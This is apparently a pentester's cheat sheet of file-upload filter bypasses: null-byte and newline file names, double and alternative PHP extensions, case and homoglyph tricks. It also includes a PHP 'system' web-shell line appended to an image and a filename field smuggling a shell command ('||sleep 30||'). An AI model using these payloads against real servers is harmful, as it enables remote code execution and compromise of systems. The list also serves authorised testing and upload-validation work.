# File Upload Bypasses

Here some bypasses 

- Null Byte (%00) Bypasses or fuzz:
    
    `test.php` → `test.php%00.jpg or test%00.php`
    
    ```bash
    test.php%0A.jpg
    test.php\n.jpg
    test.php\u000a.jpg
    test.php\u560a.jpg
    test.php#.jpg
    test.php%23.jpg
    test.php\u003b.jpg
    test.php;.jpg
    ```
    
- Nth Extentsion Bypasses:
    
    `test.php` → `test.jpg.php`
    
- Change the content type
- Magic Byte Bypasses
- Client Side Validation Bypass
- Block List Bypass
    
    `test.php, test.php3, test.pHP`
    
- Homographic Character Bypass:
- test.php → test.P hp ( p is different ) site is useful https://www.irongeek.com/homoglyph-attack-generator.php
    
    ```bash
    file upload vunlerability:
    
    upload a .php file
    for bypasses: 
    1- make it ali.php%00.png
    2- make it ali.php5 --> alternatives
    3- make it ali.php.
    4- make it ali.p.php.hp
    5- make a pic with .png and add your <?php system('id') ?> at the end
    6- change "filename=ali.png" to filename="ali||sleep 30||.png" in the request
    ```